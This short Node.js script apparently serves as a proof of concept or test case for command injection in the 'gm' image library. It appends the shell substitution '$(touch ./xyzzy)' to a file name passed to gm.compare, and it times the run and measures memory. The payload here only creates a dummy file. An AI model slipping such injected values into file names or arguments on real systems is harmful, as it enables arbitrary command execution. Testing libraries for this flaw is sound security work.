const {performance} = require('perf_hooks');
let t0 = performance.now();

done = function done(){
    console.log("Done!");

    let t1 = performance.now();
    let mem = process.memoryUsage().heapUsed / 1024 / 1024;
    console.log((t1 - t0)/1000);
    console.log(Math.round(mem * 100) / 100);
};


var DUMMY_FILE = './xyzzy';
 
var payload = "$(touch " + DUMMY_FILE + ")";

function dummySource(val){
    payload += val;
}

dummySource(' ');

var gm = require('gm');


gm.compare('.images/german.jpg',
           './images/german.jpg' + payload,
           function () { console.log("calling compare with payload: " + payload); done();});
 
//console.log("done!");
